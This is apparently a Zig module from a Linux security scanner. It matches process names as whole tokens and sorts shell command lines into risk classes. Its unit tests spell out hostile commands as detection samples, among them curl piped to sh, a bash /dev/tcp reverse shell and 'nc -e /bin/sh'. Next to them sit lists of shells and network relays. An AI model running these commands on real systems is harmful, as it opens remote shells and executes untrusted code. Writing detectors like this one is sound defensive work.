//! Token matching for names and command lines.
//!
//! linux-guardian matched substrings: 'monero' flagged wallets, an allowlisted 'sh' matched sshd
//! and bash, 'miner' matched 'minerva'. Here a name is split into lowercase alphanumeric tokens
//! and patterns match whole tokens, or runs of consecutive tokens ("xmr stak").
const std = @import("std");

/// Lowercase ASCII alphanumeric runs. Tokens longer than 64 bytes are skipped.
pub const Iterator = struct {
    text: []const u8,
    i: usize = 0,
    buf: [64]u8 = undefined,

    pub fn init(text: []const u8) Iterator {
        return .{ .text = text };
    }

    pub fn next(it: *Iterator) ?[]const u8 {
        while (it.i < it.text.len) {
            while (it.i < it.text.len and !std.ascii.isAlphanumeric(it.text[it.i])) it.i += 1;
            const start = it.i;
            while (it.i < it.text.len and std.ascii.isAlphanumeric(it.text[it.i])) it.i += 1;
            const run = it.text[start..it.i];
            if (run.len == 0 or run.len > it.buf.len) continue;
            return std.ascii.lowerString(&it.buf, run);
        }
        return null;
    }
};

pub fn hasToken(text: []const u8, word: []const u8) bool {
    var it = Iterator.init(text);
    while (it.next()) |t| if (std.mem.eql(u8, t, word)) return true;
    return false;
}

/// True when the space-separated `pattern` ("xmr stak") occurs as consecutive tokens of `text`.
pub fn hasSequence(text: []const u8, pattern: []const u8) bool {
    var want: [8][]const u8 = undefined;
    var n: usize = 0;
    var words = std.mem.tokenizeScalar(u8, pattern, ' ');
    while (words.next()) |w| {
        if (n == want.len) return false;
        want[n] = w;
        n += 1;
    }
    if (n == 0) return false;
    // Ring of the last n tokens.
    var ring: [8][64]u8 = undefined;
    var lens: [8]usize = @splat(0);
    var seen: usize = 0;
    var it = Iterator.init(text);
    while (it.next()) |t| {
        const slot = seen % n;
        @memcpy(ring[slot][0..t.len], t);
        lens[slot] = t.len;
        seen += 1;
        if (seen < n) continue;
        var ok = true;
        for (0..n) |k| {
            const s = (seen - n + k) % n;
            if (!std.mem.eql(u8, ring[s][0..lens[s]], want[k])) {
                ok = false;
                break;
            }
        }
        if (ok) return true;
    }
    return false;
}

/// The first pattern that matches, as a token sequence.
pub fn firstMatch(text: []const u8, patterns: []const []const u8) ?[]const u8 {
    for (patterns) |p| if (hasSequence(text, p)) return p;
    return null;
}

pub fn basename(path: []const u8) []const u8 {
    const trimmed = std.mem.trimEnd(u8, path, "/");
    const slash = std.mem.lastIndexOfScalar(u8, trimmed, '/') orelse return trimmed;
    return trimmed[slash + 1 ..];
}

/// True when `host` is `domain` or a subdomain of it (label boundary, case-insensitive).
pub fn domainMatches(host: []const u8, domain: []const u8) bool {
    if (host.len < domain.len) return false;
    const tail = host[host.len - domain.len ..];
    if (!std.ascii.eqlIgnoreCase(tail, domain)) return false;
    return host.len == domain.len or host[host.len - domain.len - 1] == '.';
}

/// Shells, by executable basename. Exact names only: `sshd` and `bash-completion` are not shells.
pub const shells = [_][]const u8{ "sh", "bash", "dash", "zsh", "ksh", "mksh", "ash", "csh", "tcsh", "fish", "busybox" };

pub fn isShell(name: []const u8) bool {
    for (shells) |s| if (std.mem.eql(u8, name, s)) return true;
    return false;
}

/// Script interpreters: exact names plus versioned forms such as `python3.12` and `perl5.36`.
pub fn isInterpreter(name: []const u8) bool {
    const bases = [_][]const u8{ "python", "python2", "python3", "perl", "ruby", "php", "node", "nodejs", "bun", "deno", "lua", "luajit", "tclsh", "pwsh", "awk", "gawk" };
    for (bases) |b| {
        if (std.mem.eql(u8, name, b)) return true;
        if (name.len > b.len and std.mem.startsWith(u8, name, b)) {
            const rest = name[b.len..];
            for (rest) |c| if (!(std.ascii.isDigit(c) or c == '.')) break else return true;
        }
    }
    return false;
}

/// Network relays that can hand a socket to a program.
pub fn isRelay(name: []const u8) bool {
    const relays = [_][]const u8{ "nc", "ncat", "netcat", "nc.traditional", "nc.openbsd", "socat", "telnet" };
    for (relays) |r| if (std.mem.eql(u8, name, r)) return true;
    return false;
}

pub const CommandRisk = enum {
    /// A download piped or handed to a shell or interpreter, or saved and made executable.
    download_exec,
    /// Base64 decoded straight into a shell.
    decode_exec,
    /// Bash /dev/tcp or /dev/udp redirection.
    dev_tcp,
    /// nc, ncat or socat handing a shell to a socket.
    relay_shell,
    /// The command runs a program from a temp directory.
    temp_exec,

    pub fn describe(r: CommandRisk) []const u8 {
        return switch (r) {
            .download_exec => "downloads remote content and executes it",
            .decode_exec => "decodes base64 straight into a shell",
            .dev_tcp => "opens a network connection through bash /dev/tcp",
            .relay_shell => "hands a shell to a network relay (nc -e or socat exec)",
            .temp_exec => "runs a program from a world-writable temp directory",
        };
    }
};

pub fn isTempPath(path: []const u8) bool {
    const prefixes = [_][]const u8{ "/tmp/", "/var/tmp/", "/dev/shm/", "/run/shm/", "/dev/mqueue/" };
    for (prefixes) |p| if (std.mem.startsWith(u8, path, p)) return true;
    return false;
}

/// The program a command segment runs: the first word after `sudo`, `env`, `nohup`, `exec`,
/// `nice` and VAR=value assignments.
fn segmentProgram(segment: []const u8) []const u8 {
    var words = std.mem.tokenizeAny(u8, segment, " \t\"'();&{}");
    while (words.next()) |w| {
        if (std.mem.indexOfScalar(u8, w, '=') != null and w[0] != '-' and w[0] != '/') continue;
        const skip = [_][]const u8{ "sudo", "env", "nohup", "exec", "nice", "setsid", "command", "then", "do", "time", "-c", "-e" };
        var skipped = false;
        for (skip) |s| if (std.mem.eql(u8, w, s)) {
            skipped = true;
        };
        if (skipped or w[0] == '-') continue;
        return w;
    }
    return "";
}

fn isExecutor(program: []const u8) bool {
    const name = basename(program);
    return isShell(name) or isInterpreter(name) or std.mem.eql(u8, name, "eval") or std.mem.eql(u8, name, "source") or std.mem.eql(u8, name, ".");
}

/// Classify a shell command line (a cron command, ExecStart, an rc file line or an SSH forced
/// command). Returns the most serious risk found, or null.
pub fn commandRisk(cmd: []const u8) ?CommandRisk {
    if (std.mem.indexOf(u8, cmd, "/dev/tcp/") != null or std.mem.indexOf(u8, cmd, "/dev/udp/") != null) return .dev_tcp;

    const downloaders = [_][]const u8{ "curl", "wget", "fetch", "tftp", "lwp-download", "aria2c" };
    var has_download = false;
    for (downloaders) |d| if (hasToken(cmd, d)) {
        has_download = true;
    };
    // Pipelines: split on single '|'.
    var prev_download = false;
    var prev_decode = false;
    var i: usize = 0;
    var start: usize = 0;
    while (i <= cmd.len) : (i += 1) {
        const at_end = i == cmd.len;
        if (!at_end and cmd[i] != '|') continue;
        if (!at_end and i + 1 < cmd.len and cmd[i + 1] == '|') {
            i += 1; // `||` is not a pipe
            continue;
        }
        const segment = cmd[start..i];
        const program = basename(segmentProgram(segment));
        if ((prev_download or prev_decode) and isExecutor(program)) return if (prev_download) .download_exec else .decode_exec;
        var seg_download = false;
        for (downloaders) |d| if (std.mem.eql(u8, program, d)) {
            seg_download = true;
        };
        prev_download = seg_download;
        prev_decode = std.mem.eql(u8, program, "base64") and (hasToken(segment, "d") or hasToken(segment, "decode"));
        if (isRelay(program) and (std.mem.indexOf(u8, segment, " -e") != null or std.mem.indexOf(u8, segment, " -c") != null or std.mem.indexOf(u8, segment, "exec:") != null or std.mem.indexOf(u8, segment, "EXEC:") != null)) return .relay_shell;
        start = i + 1;
    }
    if (has_download) {
        // Command substitution or process substitution feeding a shell: bash -c "$(curl ...)".
        const substitutes = std.mem.indexOf(u8, cmd, "$(") != null or std.mem.indexOfScalar(u8, cmd, '`') != null or std.mem.indexOf(u8, cmd, "<(") != null;
        if (substitutes and (hasToken(cmd, "eval") or hasToken(cmd, "sh") or hasToken(cmd, "bash") or hasToken(cmd, "source"))) return .download_exec;
        // Saved and made executable.
        if (hasToken(cmd, "chmod") and (std.mem.indexOf(u8, cmd, "+x") != null or std.mem.indexOf(u8, cmd, "777") != null or std.mem.indexOf(u8, cmd, "755") != null)) return .download_exec;
    }
    const program = segmentProgram(cmd);
    if (isTempPath(program)) return .temp_exec;
    return null;
}

test "tokens are lowercase alphanumeric runs" {
    var it = Iterator.init("/usr/bin/XMRig-6.21 --donate-level=1");
    const want = [_][]const u8{ "usr", "bin", "xmrig", "6", "21", "donate", "level", "1" };
    for (want) |w| try std.testing.expectEqualStrings(w, it.next().?);
    try std.testing.expect(it.next() == null);
}

test "whole-token matching does not fire on substrings" {
    try std.testing.expect(hasToken("xmrig-6.21", "xmrig"));
    try std.testing.expect(!hasToken("minerva", "miner"));
    try std.testing.expect(!hasToken("sshd", "sh"));
    try std.testing.expect(hasSequence("./xmr-stak --noTest", "xmr stak"));
    try std.testing.expect(!hasSequence("xmr notstak", "xmr stak"));
    try std.testing.expect(!isShell("sshd"));
    try std.testing.expect(isShell("bash"));
    try std.testing.expect(isInterpreter("python3.12"));
    try std.testing.expect(!isInterpreter("pythonista"));
    try std.testing.expect(domainMatches("pool.supportxmr.com", "supportxmr.com"));
    try std.testing.expect(!domainMatches("notsupportxmr.com", "supportxmr.com"));
}

test "command risk classification" {
    try std.testing.expectEqual(CommandRisk.download_exec, commandRisk("curl -fsSL http://x.example/i.sh | sh").?);
    try std.testing.expectEqual(CommandRisk.download_exec, commandRisk("wget -qO- http://x/y | sudo bash -s").?);
    try std.testing.expectEqual(CommandRisk.download_exec, commandRisk("bash -c \"$(curl -s http://x/y)\"").?);
    try std.testing.expectEqual(CommandRisk.download_exec, commandRisk("wget http://x/m -O /tmp/m && chmod +x /tmp/m && /tmp/m").?);
    try std.testing.expectEqual(CommandRisk.decode_exec, commandRisk("echo aGk= | base64 -d | bash").?);
    try std.testing.expectEqual(CommandRisk.dev_tcp, commandRisk("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1").?);
    try std.testing.expectEqual(CommandRisk.relay_shell, commandRisk("nc 10.0.0.1 4444 -e /bin/sh").?);
    try std.testing.expectEqual(CommandRisk.temp_exec, commandRisk("/tmp/.x/run >/dev/null 2>&1").?);
    try std.testing.expect(commandRisk("test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )") == null);
    try std.testing.expect(commandRisk("curl -fsS https://healthchecks.example/ping > /dev/null") == null);
    try std.testing.expect(commandRisk("[ -x /usr/lib/php/sessionclean ] && /usr/lib/php/sessionclean") == null);
}
